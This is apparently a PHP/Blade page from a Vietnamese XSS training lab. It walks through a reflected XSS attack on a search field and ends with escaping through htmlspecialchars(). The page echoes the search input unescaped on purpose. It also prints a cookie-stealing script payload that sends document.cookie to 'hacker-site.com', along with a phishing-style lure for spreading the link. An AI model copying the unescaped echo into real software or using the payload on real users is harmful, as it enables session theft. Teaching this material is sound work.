<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Reflected XSS</title>
  <link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" >
  <link type="text/css" rel="stylesheet" href="css/bootstrap-theme.min.css" >
  <link type="text/css" rel="stylesheet" href="css/font-awesome.min.css" >
  <link type="text/css" rel="stylesheet" href="css/style.css" >
  <base href="<?php echo e(asset('')); ?>">

</head>

<body>

  <div id="content">

      <div class="container-fluid">
        <div class="barLeft">
          <div class="icon"><a>Biểu tượng Web</a></div>
          <div class="menu"><a>Trang chủ</a></div>
          <div class="menu"><a>Giới thiệu</a></div>
          <div class="menu"><a>Mức bảo mật</a></div>
          <div class="menu"><a>Top 10 OWASP</a></div>
          <div class="menu" style="margin-top: 245px;"><a>About</a></div>
          <div class="menu"><a href="logout">Logout:  (<?php echo e(Auth::user()->name); ?>)</a></div>
        </div>

        <div class="barCenter">
          <div class="nameAttack">
            <p>Reflected XSS</p>
          </div>
          <div class="contentAttack">
            <div class="formAttack">
              <div class="headerForm">
                <p>Shopping Online</p>
              </div>
              <div class="contentForm">
                <form class="form-inline" action="" method="get" role="form">
                  <div class="form-group">
                    <label for="">Tìm kiếm</label>
                    <input name="search" type="text" class="form-control" id="" placeholder="Nhập từ khoá">
                  </div>
                  <button type="submit" class="btn btn-primary">Tìm</button>
                </form>
                <?php if($search): ?>
                <p><span>Kết quả:</span><?php echo $search?></p>
                <?php endif; ?>
              </div>
              <a href="http://acttacker.tk" target="_blank" class="view-source">View source</a>

            </div>
          </div>


        </div>

        <div class="barRight">
          <div class="title">
            <p>Reflected</p>
            <p>Hướng dẫn</p>
          </div>
          <div class="content">
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">1</span>Bobby để ý trang web <span class="mark">shopping</span> có trường tìm kiếm</p>
            </div>
            
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">2</span>Khi Bobby gõ vào thanh tìm kiếm thì kết quả in ra là giá trị mà chúng ta truyền vào qua url  Bạn hãy thử tìm kiếm với từ bất kì và xem thanh url</p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">3</span>Giá trị search mà bạn nhập vào đã được chèn vào source code. Cái gì cũng có thể chèn vào chăng? Bobby thử chèn một đoạn mã lệnh có khả năng gây nguy hiểm 
               </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">4</span>Bobby nhận ra rằng biến keywork nhận giá trị bất kì và rồi truyền lên server xử lý. Nhưng server đã không kiểm soát giá trị đầu vào này trước khi trả về cho trình duyệt dẫn đến mã javascript bị chèn vào trong source code.</p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">5</span>Bobby bắt đầu tấn công người dùng. Bobby có một trang web server của riêng hắn là <a href="http://acttacker.tk" target="_blank" class="mark">acttacker.tk</a>
                </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">6</span>Bobby tạo link chứa script như sau<br>
                - tạo mã javacript, Bobby chọn đoạn mã như sau<br>
                &ltscript&gtnewImage().src=http:/hacker-site.com /XSS/get.php?cookie=+cookie;&lt/script&gt<br>
                Đoạn mã tạo có không đúng không? hãy giúp bobby sửa lại
                </span>
                </p>
                <button class="help" type="button" data-toggle="popover" data-placement="left" title="Popover title"
                data-content="<script>new Image().src=http:/hacker-site.com /XSS/get.php?cookie=+document.cookie;</script>">?</button>
             </div>
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">7</span>Bobby chèn mã trên vào param "search": localhost/?search=&ltscript&gtnewImage().src=http:/hacker-site.com /XSS/get.php?cookie=+cookie;&lt/script&gt
                </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">8</span>Bobby đưa link chứa script cho người dùng<br>
                Có nhiều cách tiếp cận khiến người dùng nhấp vào link này. Bobby là người khôn ngoan anh ta gửi link cho bạn thân mình😊.<br>
                Panda ơi trên shopping.com có giảm giá.
                </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/user.png">
              <p class="document"><span class="step">9</span>Panda muốn mua đồ giảm giá và click vào link mà bobby gửi<br>
                Bạn hãy copy link để truy cập trang web      
                </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/user.png">
              <p class="document"><span class="step">10</span>Trang web hiển thị ra vẫn là localhost<br>
                Panda không hề hay biết mình bị lừa.<br>
                Hehe, vậy bây giờ bạn có thể lên <a href="http://acttacker.tk" target="_blank" class="mark">acttacker.tk</a> để xem cookie của mình đã bị Booby lấy
                </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/user.png">
              <p class="document"><span class="step">11</span>Vậy làm sao ta khắc phục được reflected XSS?<br>
                Đơn giản, Hãy xóa thanh tìm kiếm<br>
                Không, Tôi đùa đó😊<br>
                Như đã nói ở bước 4: Biến keywork nhận giá trị bất kì và rồi truyền lên server xử lý. Nhưng server đã không kiểm soát giá trị đầu vào này trước khi trả về cho trình duyệt dẫn đến mã javascript bị chèn vào trong source code.
                </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/user.png">
              <p class="document"><span class="step">12</span>Vậy ta sẽ kiểm soát giá trị đầu vào bằng cách sử dụng hàm htmlspecialchars() sẽ giúp thay thế các kí tự Dạng ứng dụng, ví dụ: “<“<br> thành Dạng thực thể (html Entities), ví dụ “&amp;lt;”<br>
                Truy cập <a href="prevent-xss" target="_blank">vào đây</a> và view source để xem cách ngăn chặn
                            
                </p>
            </div>

            
        
          </div>

        </div>
      </div>
  </div>
  <script src="js/jquery.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/main.js"></script>
</body>

</html><?php /**PATH /var/www/resources/views/action/xss/prenventXss.blade.php ENDPATH**/ ?>